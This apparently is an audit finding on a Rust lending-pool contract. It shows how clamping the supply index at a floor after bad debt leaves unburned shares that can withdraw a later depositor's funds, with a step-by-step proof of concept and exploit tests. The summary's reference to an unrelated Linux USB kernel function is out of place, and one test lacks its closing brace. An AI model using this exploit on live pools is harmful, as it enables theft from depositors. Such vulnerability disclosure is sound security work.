### Title
Bad-debt write-down clamps `supply_index` at `SUPPLY_INDEX_FLOOR_RAW` without burning the surviving supply shares, leaving phantom claims that drain fresh deposits - (File: contracts/pool/src/interest.rs)

### Summary
`snd_usb_handle_sync_urb()`'s bug class — a value clamped at one boundary but propagated unclamped to consumers that can exceed real limits — maps onto `apply_bad_debt_to_supply_index` in the pool. When bad debt is socialized, the supply-index reduction is capped at the index floor (`RAY/1000`) rather than at zero, but the outstanding `scaled_amount` supply shares are never reduced or burned. If a wipeout hits the floor, every surviving supplier keeps a residual claim worth `scaled * RAY/1000` backed by nothing. Those claims remain withdrawable and are paid out of any cash later deposited into the market — i.e., a wiped supplier can drain a fresh depositor's funds.

### Finding Description
`apply_bad_debt_to_supply_index` computes `total_supplied_value = supplied * supply_index`, caps the write-down at that value (`bad_debt.min(total_supplied_value)`), then applies the reduction factor but floors the resulting index at `SUPPLY_INDEX_FLOOR_RAW` [1](#0-0) . When `bad_debt >= total_supplied_value`, the factor would be zero, but the floor pins the index at `0.001 * RAY`, leaving every supply share worth 0.1% of face value even though the market was fully wiped.

Crucially, `supplied` (total scaled shares) and each position's `scaled_amount` are untouched. On the borrow side, `ops::seize::apply` only burns debt shares [2](#0-1) . A later `withdraw` resolves the full claim via `resolve_withdrawal`, and `require_reserves` only checks the cash balance — it does not check that claims are backed by that owner's contribution [3](#0-2) .

The repository's own tests demonstrate the exploit against the raw cache: after a wipeout the wiped supplier's stranded claim is paid out of a fresh deposit, leaving the fresh depositor's claim unbacked and the pool drained to zero [4](#0-3) . The same scenario is shown for a seizure wipeout [5](#0-4) .

### Impact Explanation
Theft of user funds / protocol insolvency. Any account holding wiped supply shares (including the wiped borrower's own collateral suppliers, or anyone whose shares survive) can withdraw real tokens as soon as any honest user supplies fresh cash to the market, extracting value up to their stranded claim and leaving the fresh supplier's position unbacked. The stranded claims aggregate to `supplied * SUPPLY_INDEX_FLOOR_RAW`, i.e., 0.1% of the wiped market's total supply — material on large markets.

### Likelihood Explanation
An unprivileged path exists: any account that accrues insolvent debt can have it cleaned via the permissionless `clean_bad_debt`/`seize_positions` flow, which calls `apply_bad_debt_to_supply_index`. A wipeout requires bad debt ≥ total supplied value — achievable when a market's collateral becomes worthless or was never collateralized (e.g., dust bad debt on a thin market, or a spoke configured with weak collateral). After the wipeout, the attacker simply waits for (or lures) a fresh deposit and calls `withdraw` on their stranded position. One caveat I could not fully verify: whether the controller layer adds a guard (e.g., freezing the market or gating withdrawals) after a full wipeout — the pool-layer tests explicitly exercise the "without supply guard" case, but a controller-side mitigation is possible and would reduce severity.

### Recommendation
When the bad-debt write-down saturates the floor (i.e., `bad_debt >= total_supplied_value`), burn or zero the surviving `supplied` shares alongside clamping the index — or block further withdrawals/supplies on a floored market until `recapitalize` restores parity. At minimum, track the deficit (`bad_debt - remaining_value`) and make `resolve_withdrawal` on floored positions return zero until recapitalization covers the deficit.

### Proof of Concept
1. Alice supplies `S` units to a market; a position accrues `D >= S * index` of bad debt (e.g., uncollateralized dust grows, or collateral collapses).
2. A permissionless `clean_bad_debt` triggers `seize_positions` → `apply_bad_debt_to_supply_index` → `supply_index` clamps to `SUPPLY_INDEX_FLOOR_RAW`; `supplied` and Alice's `scaled_amount` are unchanged.
3. Bob supplies `C` units fresh; pool cash becomes `C`.
4. Alice calls `withdraw` with amount `0` (full close). `resolve_withdrawal` computes `gross = scaled * FLOOR ≈ 0.1% * S > 0`; `require_reserves(C >= gross)` passes; Alice receives `gross` paid from Bob's deposit, while Bob's claim `C` remains — pool is now owed `C` but holds `C - gross` (or zero if sized so).
5. Bob cannot fully withdraw; the deficit is realized theft.

This exact sequence is encoded in `contracts/pool/tests/interest.rs` (`test_raw_cache_floor_residual_can_consume_fresh_cash_without_supply_guard`, `test_raw_cache_seizure_residual_would_drain_fresh_cash_without_supply_guard`), which shows `gross == C` — Alice drains exactly Bob's deposit and the pool is left unable to cover Bob's claim [6](#0-5) .

pub(crate) fn apply_bad_debt_to_supply_index(cache: &mut Cache, bad_debt: Ray) {
    let total_supplied_value = cache.supplied().mul(cache.env(), cache.supply_index());

    if total_supplied_value == Ray::ZERO {
        return;
    }

    let capped = bad_debt.min(total_supplied_value);
    let remaining = total_supplied_value.checked_sub(cache.env(), capped);

    let reduction_factor = remaining.div_floor(cache.env(), total_supplied_value);
    let new_supply_index = cache
        .supply_index()
        .mul_floor(cache.env(), reduction_factor);

    cache.set_supply_index(new_supply_index.max(Ray::from(SUPPLY_INDEX_FLOOR_RAW)));
}

fn test_raw_cache_floor_residual_can_consume_fresh_cash_without_supply_guard() {
    let t = TestSetup::new();
    t.as_contract(|| {
        let scaled_a_raw = 1_000_000 * RAY;
        let mut cache = t.fresh_cache(PoolStateRaw {
            supplied: scaled_a_raw,
            borrowed: 0,
            revenue: 0,
            borrow_index: RAY,
            supply_index: RAY,
            last_timestamp: 0,
            cash: 0,
        });
        let scaled_a = Ray::from(scaled_a_raw);

        apply_bad_debt_to_supply_index(&mut cache, Ray::from(2_000_000 * RAY));
        assert_eq!(
            cache.supply_index().raw(),
            SUPPLY_INDEX_FLOOR_RAW,
            "wipeout must clamp supply index UP to the floor, not reset the base"
        );

        let stranded = cache.unscale_supply_floor(scaled_a);
        assert!(stranded > 0, "floor clamp leaves userA a phantom claim");
        assert_eq!(cache.cash(), 0, "empty market: no cash to extract yet");

        let c = stranded;
        let scaled_b = cache.calculate_scaled_supply(c);
        cache.mint_supply(scaled_b);
        cache.credit_cash(c);

        let b_claim = cache.unscale_supply_floor(scaled_b);
        assert_eq!(b_claim, c, "userB's honest claim equals their deposit");

        let (burn, gross) = cache.resolve_withdrawal(i128::MAX, scaled_a);
        cache.require_reserves(gross);
        cache.burn_supply(burn);
        cache.debit_cash(gross);

        assert!(gross > 0, "stranded position pays out non-zero");
        assert_eq!(
            gross, c,
            "userA drains exactly userB's fresh deposit out of the pool"
        );

        assert!(
            cache.cash() < b_claim,
            "pool cash ({}) can no longer cover userB's claim ({}): honest supplier lost funds",
            cache.cash(),
            b_claim
        );
        assert_eq!(cache.cash(), 0, "userA drained the pool to empty");
    });

fn test_raw_cache_seizure_residual_would_drain_fresh_cash_without_supply_guard() {
    let t = TestSetup::new();
    t.as_contract(|| {
        let alice_scaled_raw = 1_000 * RAY;
        let borrowed_scaled_raw = 1_000 * RAY;
        let mut cache = t.fresh_cache(PoolStateRaw {
            supplied: alice_scaled_raw,
            borrowed: borrowed_scaled_raw,
            revenue: 0,
            borrow_index: RAY,
            supply_index: RAY,
            last_timestamp: 0,
            cash: 0,
        });
        let alice_scaled = Ray::from(alice_scaled_raw);
        let borrow_scaled = Ray::from(borrowed_scaled_raw);

        let bad_debt = cache.unscale_borrow_ceil_ray(borrow_scaled);
        apply_bad_debt_to_supply_index(&mut cache, bad_debt);
        cache.burn_debt(borrow_scaled);

        assert_eq!(
            cache.supply_index().raw(),
            SUPPLY_INDEX_FLOOR_RAW,
            "seize wipeout clamps supply_index UP to RAY/1000, leaving unburned shares a residual"
        );

        let alice_stranded = cache.unscale_supply_floor(alice_scaled);
        assert!(alice_stranded > 0, "wiped survivor keeps a stranded claim");
        assert_eq!(
            cache.cash(),
            0,
            "empty market: claim masked by require_reserves"
        );

        let deposit = alice_stranded;
        let bob_scaled = cache.calculate_scaled_supply(deposit);
        cache.mint_supply(bob_scaled);
        cache.credit_cash(deposit);

        let total_owed = cache.unscale_supply_floor(cache.supplied());
        assert!(
            total_owed > cache.cash(),
            "post-deposit books insolvent: owed {} > cash {}",
            total_owed,
            cache.cash()
        );

        let (burn, gross) = cache.resolve_withdrawal(i128::MAX, alice_scaled);
        cache.require_reserves(gross);
        cache.burn_supply(burn);
        cache.debit_cash(gross);

        assert!(gross > 0, "wiped position pays out real cash");
        assert_eq!(gross, deposit, "Alice extracts exactly Bob's fresh deposit");

        let bob_claim = cache.unscale_supply_floor(bob_scaled);
        assert!(
            cache.cash() < bob_claim,
            "cash {} cannot cover Bob's honest claim {}: fresh depositor lost funds",
            cache.cash(),
            bob_claim
        );
    });
}
